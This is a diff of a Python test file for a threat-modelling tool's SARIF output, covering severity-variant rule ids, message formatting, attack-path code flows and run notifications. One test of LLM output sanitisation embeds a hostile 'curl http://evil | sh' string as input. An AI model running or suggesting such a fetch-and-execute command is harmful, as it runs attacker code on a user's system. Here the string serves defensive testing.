@@ -552,8 +552,12 @@ class TestSecuritySeverityAndPrecision:
             severity_reason="internet reachable data store",
         )
         run = run_of(threat)
-        assert rules_by_id(run)["R1"]["properties"]["security-severity"] == "9.5"
+        # The rule's own id keeps the findings at its base severity; this one context raised.
+        rule = rules_by_id(run)["R1/critical"]
+        assert rule["properties"]["security-severity"] == "9.5"
         result = run["results"][0]
+        assert result["ruleId"] == "R1/critical"
+        assert result["properties"]["security-severity"] == "9.5"
         assert result["level"] == "error"
         assert result["properties"]["severity"] == "critical"
         assert result["properties"]["base_severity"] == "medium"
@@ -564,10 +568,14 @@ class TestSecuritySeverityAndPrecision:
             make_threat(threat_id="a", address="x", severity=Severity.LOW),
             make_threat(threat_id="b", address="y", severity=Severity.HIGH),
         )
-        rule = rules_by_id(run)["R1"]
-        assert rule["properties"]["security-severity"] == "8.0"
-        assert rule["defaultConfiguration"]["level"] == "error"
-        assert sorted(r["level"] for r in run["results"]) == ["error", "note"]
+        # Two severities of one rule are two rules, because GitHub ranks by the rule's severity.
+        rules = rules_by_id(run)
+        assert rules["R1"]["properties"]["security-severity"] == "8.0"
+        assert rules["R1"]["defaultConfiguration"]["level"] == "error"
+        assert rules["R1/low"]["properties"]["security-severity"] == "3.0"
+        assert rules["R1/low"]["defaultConfiguration"]["level"] == "note"
+        by_rule = {r["ruleId"]: r["level"] for r in run["results"]}
+        assert by_rule == {"R1": "error", "R1/low": "note"}
 
     @pytest.mark.parametrize(
         ("confidence", "precision"), [(1.0, "high"), (0.7, "medium"), (0.5, "low"), (0.0, "low")]
@@ -650,17 +658,57 @@ class TestTagsAndHelp:
 
 
 class TestMessages:
-    def test_the_message_humanizes_the_stride_label_and_names_the_resource(self) -> None:
+    def test_a_rule_message_is_the_title_and_the_resource_only(self) -> None:
+        threat = make_threat(
+            title="EC2 instance metadata service allows IMDSv1",
+            address="aws_instance.app[0]",
+            description="A long explanation that is the same for every instance. " * 20,
+        )
+        text = run_of(threat)["results"][0]["message"]["text"]
+        assert text == "EC2 instance metadata service allows IMDSv1 on aws_instance.app[0]"
+
+    def test_the_explanation_is_in_the_rule_and_not_in_every_result(self) -> None:
+        description = "The generic explanation of what is wrong. It is long and general."
+        run = run_of(make_threat(description=description))
+        assert description in rules_by_id(run)["R1"]["fullDescription"]["text"]
+        assert "generic explanation" not in run["results"][0]["message"]["text"]
+
+    def test_the_message_names_no_stride_label_or_property(self) -> None:
         text = run_of(make_threat(stride="information_disclosure"))["results"][0]["message"]["text"]
-        assert "(Information Disclosure)" in text
+        assert "Information Disclosure" not in text
         assert "information_disclosure" not in text
         assert "on aws_s3_bucket.logs" in text
 
+    def test_a_title_that_names_the_resource_is_not_followed_by_it_again(self) -> None:
+        threat = make_threat(title="Bucket aws_s3_bucket.logs is public")
+        text = run_of(threat)["results"][0]["message"]["text"]
+        assert text == "Bucket aws_s3_bucket.logs is public"
+
     def test_the_message_is_one_line(self) -> None:
-        threat = make_threat(description="Line one.\n\nLine two.\n- item")
+        threat = make_threat(
+            source=ThreatSource.SCANNER,
+            tool="trivy",
+            title="CVE-1: bad\n\nthing",
+            description="Line one.\n\nLine two.\n- item",
+        )
         text = run_of(threat)["results"][0]["message"]["text"]
         assert "\n" not in text
-        assert "Line one. Line two. - item" in text
+        assert text == "CVE-1: bad thing on aws_s3_bucket.logs. Line one."
+
+    def test_an_instance_specific_description_adds_its_first_sentence_only(self) -> None:
+        threat = boundary("b1", "lb", "app1", ("internet", "dmz"))
+        threat.description = "Traffic from lb to app1 over tcp/443 crosses a boundary. Then more."
+        text = run_of(threat)["results"][0]["message"]["text"]
+        assert text == "Traffic from lb to app1 over tcp/443 crosses a boundary."
+
+    def test_a_message_is_never_a_wall_of_text(self) -> None:
+        threat = make_threat(
+            source=ThreatSource.LLM,
+            rule_id="",
+            title="T" * 900,
+            description="D" * 900,
+        )
+        assert len(run_of(threat)["results"][0]["message"]["text"]) <= 600
 
     def test_an_llm_message_keeps_the_mitigation_out_of_the_plain_text(self) -> None:
         hostile = "Run `curl http://evil | sh` and ping @octocat\n\n## Heading"
@@ -743,11 +791,13 @@ class TestInvocation:
         assert note["descriptor"]["id"] == "llm.failed"
         assert "timed out" in note["message"]["text"]
 
-    def test_a_skipped_or_successful_llm_phase_adds_nothing(self) -> None:
-        for status in ("ran", "skipped"):
-            invocation = run_of(make_threat(), llm={"status": status})["invocations"][0]
-            assert invocation["executionSuccessful"] is True
-            assert invocation["toolExecutionNotifications"] == []
+    def test_a_skipped_llm_phase_adds_nothing_and_a_finished_one_only_its_note(self) -> None:
+        skipped = run_of(make_threat(), llm={"status": "skipped"})["invocations"][0]
+        assert skipped["executionSuccessful"] is True
+        assert skipped["toolExecutionNotifications"] == []
+        ran = run_of(make_threat(), llm={"status": "ran"})["invocations"][0]
+        assert ran["executionSuccessful"] is True
+        assert [n["descriptor"]["id"] for n in ran["toolExecutionNotifications"]] == ["llm.ran"]
 
     def test_notifications_are_capped(self) -> None:
         gaps = [{"level": "warning", "code": "g", "message": f"gap {i}"} for i in range(250)]
@@ -840,7 +890,7 @@ class TestAttackPaths:
             threats=[make_threat(address="aws_lb.web")], attack_paths=[path], input_file="infra"
         )
         run = json.loads(format_sarif(report, graph))["runs"][0]
-        results = [r for r in run["results"] if r["ruleId"] == ATTACK_PATH_RULE]
+        results = [r for r in run["results"] if r["ruleId"].startswith(ATTACK_PATH_RULE)]
         assert len(results) == 1
         return results[0]  # type: ignore[no-any-return]
 
@@ -857,6 +907,25 @@ class TestAttackPaths:
     def test_the_level_follows_the_path_severity(self) -> None:
         assert self.result_for(make_path(Severity.CRITICAL), path_graph())["level"] == "error"
         assert self.result_for(make_path(Severity.MEDIUM), path_graph())["level"] == "warning"
+
+    def test_a_path_rule_has_the_severity_of_its_paths(self) -> None:
+        paths = [make_path(Severity.CRITICAL), make_path(Severity.MEDIUM)]
+        paths[1].id = "ffffffffffff"
+        report = ThreatReport(threats=[make_threat()], attack_paths=paths)
+        run = json.loads(format_sarif(report, path_graph()))["runs"][0]
+        rules = rules_by_id(run)
+        assert rules[ATTACK_PATH_RULE]["properties"]["security-severity"] == "9.5"
+        medium = rules[f"{ATTACK_PATH_RULE}/medium"]
+        assert medium["properties"]["security-severity"] == "5.5"
+        assert medium["defaultConfiguration"]["level"] == "warning"
+        by_id = {
+            r["properties"]["attack_path_id"]: r
+            for r in run["results"]
+            if "attack_path_id" in r["properties"]
+        }
+        assert by_id["0123456789ab"]["ruleId"] == ATTACK_PATH_RULE
+        assert by_id["ffffffffffff"]["ruleId"] == f"{ATTACK_PATH_RULE}/medium"
+        assert by_id["ffffffffffff"]["properties"]["security-severity"] == "5.5"
 
     def test_a_code_flow_walks_the_hops_in_order(self) -> None:
         result = self.result_for(make_path(), path_graph())
@@ -877,16 +946,72 @@ class TestAttackPaths:
         web = by_name["aws_lb.web"]["physicalLocation"]
         assert web["artifactLocation"]["uri"] == "infra/main.tf"
         assert web["region"] == {"startLine": 5, "endLine": 8}
-        assert "physicalLocation" not in by_name["internet"]
+
+    def test_the_internet_hop_is_shown_at_the_resource_it_enters(self) -> None:
+        steps = self.result_for(make_path(), path_graph())["codeFlows"][0]["threadFlows"][0][
+            "locations"
+        ]
+        first = steps[0]["location"]
+        assert first["logicalLocations"][0]["fullyQualifiedName"] == "internet"
+        assert first["physicalLocation"]["region"]["startLine"] == 5
+        assert "shown at aws_lb.web" in first["message"]["text"]
+
+    def test_every_step_and_related_location_has_a_physical_location_when_a_hop_has_a_file(
+        self,
+    ) -> None:
+        result = self.result_for(make_path(), path_graph())
+        steps = result["codeFlows"][0]["threadFlows"][0]["locations"]
+        assert all("physicalLocation" in s["location"] for s in steps)
+        assert all("physicalLocation" in r for r in result["relatedLocations"])
+
+    def test_a_hop_message_names_the_findings_that_enable_it(self) -> None:
+        enabling = make_threat(threat_id="t1", address="aws_lb.web", rule_id="LB_OPEN")
+        report = ThreatReport(threats=[enabling], attack_paths=[make_path()])
+        run = json.loads(format_sarif(report, path_graph()))["runs"][0]
+        result = next(r for r in run["results"] if r["ruleId"].startswith(ATTACK_PATH_RULE))
+        steps = result["codeFlows"][0]["threadFlows"][0]["locations"]
+        texts = [s["location"]["message"]["text"] for s in steps]
+        assert texts[1].startswith("Hop 2: aws_lb.web -> aws_instance.app (network_flow")
+        assert "enabled by LB_OPEN" in texts[1]
+        assert "enabled by" not in texts[2]
+
+    def test_a_hop_message_uses_the_rule_id_the_alert_carries(self) -> None:
+        enabling = make_threat(
+            threat_id="t1",
+            address="aws_lb.web",
+            rule_id="LB_OPEN",
+            severity=Severity.MEDIUM,
+            effective_severity=Severity.HIGH,
+        )
+        report = ThreatReport(threats=[enabling], attack_paths=[make_path()])
+        run = json.loads(format_sarif(report, path_graph()))["runs"][0]
+        ids = {r["ruleId"] for r in run["results"]}
+        assert "LB_OPEN/high" in ids
+        result = next(r for r in run["results"] if r["ruleId"].startswith(ATTACK_PATH_RULE))
+        text = result["relatedLocations"][1]["message"]["text"]
+        assert "enabled by LB_OPEN/high" in text
+
+    def test_a_hop_message_names_the_ports_of_a_flow(self) -> None:
+        result = self.result_for(make_path(), path_graph())
+        assert "(network_flow" in result["relatedLocations"][0]["message"]["text"]
 
     def test_every_hop_is_a_related_location(self) -> None:
         related = self.result_for(make_path(), path_graph())["relatedLocations"]
         assert [r["id"] for r in related] == [1, 2, 3, 4]
         assert related[1]["message"]["text"].startswith("Hop 2: aws_lb.web")
 
-    def test_the_primary_location_is_the_target_definition(self) -> None:
-        location = primary(self.result_for(make_path(), path_graph()))
-        assert location["region"]["startLine"] == 40
+    def test_the_primary_location_is_the_first_resource_with_a_file(self) -> None:
+        # The entry point, where a fix goes, not the target the path ends at.
+        result = self.result_for(make_path(), path_graph())
+        location = primary(result)
+        assert location["region"]["startLine"] == 5
+        assert result["locations"][0]["logicalLocations"][0]["fullyQualifiedName"] == "aws_lb.web"
+        assert "entering at aws_lb.web" in result["message"]["text"]
+
+    def test_the_path_message_is_short_and_the_story_is_in_the_code_flow(self) -> None:
+        result = self.result_for(make_path(), path_graph())
+        assert "The database is reachable" not in result["message"]["text"]
+        assert "The database is reachable" in result["codeFlows"][0]["message"]["text"]
 
     def test_without_a_graph_the_result_still_has_a_physical_location_and_region(self) -> None:
         result = self.result_for(make_path(), None)
@@ -926,3 +1051,296 @@ class TestAttackPaths:
 
     def test_a_scan_without_paths_has_no_path_rule(self) -> None:
         assert ATTACK_PATH_RULE not in rules_by_id(run_of(make_threat()))
+
+
+# ---------------------------------------------------------------------------------------
+# Rule ids and names (FV-23)
+# ---------------------------------------------------------------------------------------
+
+
+def scanner_threat(rule_id: str, tool: str = "trivy", **fields: Any) -> Threat:
+    return make_threat(
+        rule_id=rule_id,
+        source=ThreatSource.SCANNER,
+        tool=tool,
+        evidence="scanner",
+        title=fields.pop(
+            "title", "CVE-2022-37434: zlib: heap-based buffer over-read and overflow in inflate()"
+        ),
+        **fields,
+    )
+
+
+class TestScannerRuleIds:
+    def test_an_id_that_already_carries_the_tool_prefix_is_not_prefixed_again(self) -> None:
+        assert rule_key(scanner_threat("trivy:CVE-2022-37434")) == "trivy:CVE-2022-37434"
+
+    def test_a_bare_id_gets_the_tool_prefix_once(self) -> None:
+        assert rule_key(scanner_threat("CVE-2022-37434")) == "trivy:CVE-2022-37434"
+
+    def test_another_tools_prefix_is_not_mistaken_for_the_tools_own(self) -> None:
+        assert rule_key(scanner_threat("grype:CVE-1", tool="trivy")) == "trivy:grype:CVE-1"
+
+    def test_the_rule_in_the_document_has_one_prefix(self) -> None:
+        run = run_of(scanner_threat("trivy:CVE-2022-37434"))
+        assert [r["id"] for r in run["tool"]["driver"]["rules"]] == ["trivy:CVE-2022-37434"]
+        assert run["results"][0]["ruleId"] == "trivy:CVE-2022-37434"
+
+    @pytest.mark.parametrize(
+        "fixture",
+        [
+            "grype-image.json",
+            "osv-lockfile.json",
+            "sarif-checkov.json",
+            "sarif-gitleaks.json",
+            "sarif-trivy.json",
+            "trivy-fs.json",
+            "trivy-image.json",
+        ],
+    )
+    def test_no_ingest_reader_produces_a_doubled_prefix(self, fixture: str) -> None:
+        from threatcode.formatters import render
+        from threatcode.pipeline import prepare_request, run_scan
+
+        prepared = prepare_request(
+            [str(REPO_ROOT / "examples" / "aws-webapp")],
+            ingest=[FIXTURES / "ingest" / fixture],
+            fail_on="none",
+        )
+        analysis = run_scan(prepared.request).analysis
+        run = json.loads(render("sarif", analysis))["runs"][0]
+        scanner = [r for r in run["tool"]["driver"]["rules"] if ":" in r["id"]]
+        assert scanner, fixture
+        for rule in scanner:
+            tool, _, rest = rule["id"].partition(":")
+            assert ":" not in rest, rule["id"]
+            assert not rest.startswith(f"{tool}:")
+
+
+class TestRuleNames:
+    def test_an_advisory_id_is_its_own_name(self) -> None:
+        run = run_of(scanner_threat("trivy:CVE-2022-37434"))
+        assert run["tool"]["driver"]["rules"][0]["name"] == "CVE-2022-37434"
+
+    def test_the_name_comes_from_the_id_not_the_title(self) -> None:
+        threat = make_threat(rule_id="K8S_NO_SECCOMP_PROFILE", title="Container without a profile")
+        name = run_of(threat)["tool"]["driver"]["rules"][0]["name"]
+        assert name == "K8SNoSeccompProfile"
+
+    def test_acronyms_in_an_id_are_kept(self) -> None:
+        threat = make_threat(rule_id="MCP_SECRET_IN_CONFIG")
+        assert run_of(threat)["tool"]["driver"]["rules"][0]["name"] == "MCPSecretInConfig"
+
+    def test_a_very_long_id_is_cut_at_a_word_not_in_the_middle_of_one(self) -> None:
+        rule_id = "_".join(["SEGMENT"] * 30)
+        name = run_of(make_threat(rule_id=rule_id))["tool"]["driver"]["rules"][0]["name"]
+        assert len(name) <= 64
+        assert name == "Segment" * (len(name) // 7)
+
+    def test_a_long_title_is_cut_at_a_word_boundary(self) -> None:
+        name = _to_pascal_case("alpha beta " * 30, limit=20)
+        assert len(name) <= 20
+        assert name in {"AlphaBeta" * n + "Alpha" for n in range(3)} | {"AlphaBeta" * 2}
+
+    def test_boundary_and_llm_rules_have_short_names(self) -> None:
+        run = run_of(boundary("b1", "lb", "app1", ("internet", "dmz")), llm_threat("l1", "a"))
+        names = {r["id"]: r["name"] for r in run["tool"]["driver"]["rules"]}
+        assert names["THREATCODE_BOUNDARY_INTERNET_DMZ"] == "BoundaryInternetDmz"
+        assert names[LLM_RULE] == "LLM"
+
+
+# ---------------------------------------------------------------------------------------
+# One severity per rule (FV-24)
+# ---------------------------------------------------------------------------------------
+
+
+class TestOneSeverityPerRule:
+    def mixed(self) -> dict[str, Any]:
+        return run_of(
+            make_threat(threat_id="a", address="x", severity=Severity.LOW),
+            make_threat(
+                threat_id="b",
+                address="y",
+                severity=Severity.LOW,
+                effective_severity=Severity.HIGH,
+                severity_reason="reachable from the internet",
+            ),
+            make_threat(
+                threat_id="c",
+                address="z",
+                severity=Severity.LOW,
+                effective_severity=Severity.MEDIUM,
+            ),
+        )
+
+    def test_every_result_has_the_level_and_score_of_its_rule(self) -> None:
+        run = self.mixed()
+        rules = rules_by_id(run)
+        for result in run["results"]:
+            rule = rules[result["ruleId"]]
+            assert result["level"] == rule["defaultConfiguration"]["level"]
+            assert (
+                result["properties"]["security-severity"]
+                == (rule["properties"]["security-severity"])
+            )
+
+    def test_the_base_severity_keeps_the_bare_id_and_the_others_are_variants(self) -> None:
+        by_address = {
+            r["locations"][0]["logicalLocations"][0]["fullyQualifiedName"]: r["ruleId"]
+            for r in self.mixed()["results"]
+        }
+        assert by_address == {"x": "R1", "y": "R1/high", "z": "R1/medium"}
+
+    def test_a_finding_keeps_its_id_when_another_instance_changes(self) -> None:
+        alone = run_of(make_threat(threat_id="a", address="x", severity=Severity.LOW))
+        with_other = run_of(
+            make_threat(threat_id="a", address="x", severity=Severity.LOW),
+            make_threat(
+                threat_id="b",
+                address="y",
+                severity=Severity.LOW,
+                effective_severity=Severity.CRITICAL,
+            ),
+        )
+        ids = {
+            r["locations"][0]["logicalLocations"][0]["fullyQualifiedName"]: r["ruleId"]
+            for r in with_other["results"]
+        }
+        assert alone["results"][0]["ruleId"] == ids["x"] == "R1"
+
+    def test_a_rule_with_one_severity_is_one_rule_with_no_suffix(self) -> None:
+        run = run_of(
+            make_threat(threat_id="a", address="x"), make_threat(threat_id="b", address="y")
+        )
+        assert [r["id"] for r in run["tool"]["driver"]["rules"]] == ["R1"]
+
+    def test_a_variant_rule_is_the_same_rule_at_another_severity(self) -> None:
+        rules = rules_by_id(self.mixed())
+        for suffix in ("high", "medium"):
+            variant = rules[f"R1/{suffix}"]
+            assert variant["name"] == rules["R1"]["name"]
+            assert variant["fullDescription"] == rules["R1"]["fullDescription"]
+            assert variant["help"] == rules["R1"]["help"]
+        assert rules["R1/high"]["properties"]["security-severity"] == "8.0"
+        assert rules["R1/medium"]["properties"]["security-severity"] == "5.5"
+
+    def test_the_rule_indexes_still_point_at_the_rules(self) -> None:
+        run = self.mixed()
+        rules = run["tool"]["driver"]["rules"]
+        for result in run["results"]:
+            assert rules[result["ruleIndex"]]["id"] == result["ruleId"]
+
+    def test_boundary_rules_with_different_flow_severities_split(self) -> None:
+        high = boundary("b1", "lb", "app1", ("internet", "dmz"))
+        medium = boundary("b2", "lb", "app2", ("internet", "dmz"))
+        medium.severity = Severity.MEDIUM
+        run = run_of(high, medium)
+        rules = rules_by_id(run)
+        assert set(rules) == {
+            "THREATCODE_BOUNDARY_INTERNET_DMZ",
+            "THREATCODE_BOUNDARY_INTERNET_DMZ/medium",
+        }
+        for result in run["results"]:
+            assert result["level"] == rules[result["ruleId"]]["defaultConfiguration"]["level"]
+
+    def test_an_info_finding_has_a_note_and_no_score_on_rule_or_result(self) -> None:
+        run = run_of(make_threat(severity=Severity.INFO))
+        assert "security-severity" not in run["tool"]["driver"]["rules"][0]["properties"]
+        assert "security-severity" not in run["results"][0]["properties"]
+        assert run["results"][0]["level"] == "note"
+
+
+# ---------------------------------------------------------------------------------------
+# What the report leaves out, and what it was joined to
+# ---------------------------------------------------------------------------------------
+
+
+def notes_of(run: dict[str, Any]) -> dict[str, dict[str, Any]]:
+    return {n["descriptor"]["id"]: n for n in run["invocations"][0]["toolExecutionNotifications"]}
+
+
+class TestSetAsideNotifications:
+    def test_suppressed_findings_and_paths_are_counted(self) -> None:
+        coverage = Coverage(suppressed=3, suppressed_paths=1)
+        note = notes_of(run_of(make_threat(), coverage=coverage))["suppressions.applied"]
+        assert note["level"] == "note"
+        assert note["message"]["text"] == (
+            "2 findings and 1 attack path suppressed by the ignore file and not in this report"
+        )
+
+    def test_baselined_findings_are_counted(self) -> None:
+        coverage = Coverage(baselined=1)
+        text = notes_of(run_of(make_threat(), coverage=coverage))["baseline.applied"]["message"][
+            "text"
+        ]
+        assert text == "1 finding already in the baseline and not in this report"
+
+    def test_findings_hidden_by_min_severity_are_counted_with_the_severity(self) -> None:
+        coverage = Coverage(hidden_findings=4, hidden_paths=2, min_severity="high")
+        text = notes_of(run_of(make_threat(), coverage=coverage))["min_severity.hidden"]["message"][
+            "text"
+        ]
+        assert text.startswith("4 findings and 2 attack paths below high left out")
+
+    def test_a_report_that_sets_nothing_aside_says_nothing(self) -> None:
+        assert notes_of(run_of(make_threat())) == {}
+
+    def test_set_aside_notes_keep_the_invocation_successful(self) -> None:
+        coverage = Coverage(suppressed=1, baselined=1, hidden_findings=1, min_severity="low")
+        assert run_of(make_threat(), coverage=coverage)["invocations"][0]["executionSuccessful"]
+
+
+class TestIngestAndLlmNotifications:
+    SOURCE = {
+        "tool": "trivy",
+        "file": "scanner/trivy-app-image.json",
+        "findings": 3,
+        "attached": 2,
+        "unattached": 1,
+        "duplicates": 1,
+    }
+
+    def run_with(self, sources: list[dict[str, Any]], **report_fields: Any) -> dict[str, Any]:
+        report = ThreatReport(threats=[make_threat()], input_file="main.tf", **report_fields)
+        return json.loads(format_sarif(report, ingest_sources=sources))["runs"][0]  # type: ignore[no-any-return]
+
+    def test_each_ingested_source_is_a_note(self) -> None:
+        text = notes_of(self.run_with([self.SOURCE]))["ingest.source"]["message"]["text"]
+        assert text == (
+            "ingested 3 trivy findings from scanner/trivy-app-image.json: 2 attached to a "
+            "resource, 1 not attached, 1 dropped as already reported"
+        )
+
+    def test_no_source_is_no_note(self) -> None:
+        assert "ingest.source" not in notes_of(self.run_with([]))
+
+    def test_the_render_path_carries_the_sources_of_the_analysis(self) -> None:
+        from threatcode.formatters import render
+        from threatcode.models.analysis import AnalysisResult
+
+        analysis = AnalysisResult(
+            graph=InfraGraph(),
+            report=ThreatReport(threats=[make_threat()], input_file="main.tf"),
+            ingest_sources=[dict(self.SOURCE)],
+        )
+        run = json.loads(render("sarif", analysis))["runs"][0]
+        assert "ingest.source" in notes_of(run)
+
+    def test_a_finished_llm_phase_says_its_findings_are_advisory(self) -> None:
+        llm = {
+            "status": "ran",
+            "provider": "anthropic",
+            "model": "claude-sonnet-5-5",
+            "threat_count": 2,
+            "unattributed_count": 1,
+            "context": {"reduced": True, "nodes_dropped": 7},
+        }
+        text = notes_of(self.run_with([], llm=llm))["llm.ran"]["message"]["text"]
+        assert "anthropic/claude-sonnet-5-5" in text
+        assert "2 advisory findings" in text
+        assert "never failing the gate" in text
+        assert "reduced to fit the token limit (7 nodes left out)" in text
+        assert "1 named no resource in the scan and were set aside" in text
+
+    def test_a_skipped_llm_phase_adds_no_note(self) -> None:
+        assert "llm.ran" not in notes_of(self.run_with([], llm={"status": "skipped"}))
